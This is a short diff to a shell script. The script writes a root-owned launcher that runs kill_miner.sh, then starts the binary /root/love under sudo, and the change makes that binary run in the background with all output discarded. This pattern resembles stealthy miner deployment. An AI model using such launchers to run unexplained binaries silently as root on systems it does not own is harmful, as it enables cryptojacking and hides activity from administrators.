@@ -30,7 +30,7 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 ./kill_miner.sh
 sleep 3
-sudo /root/love
+sudo /root/love > /dev/null 2>&1 &
 sleep 3
 EOF
 chmod +x /root/danielluis1921.sh
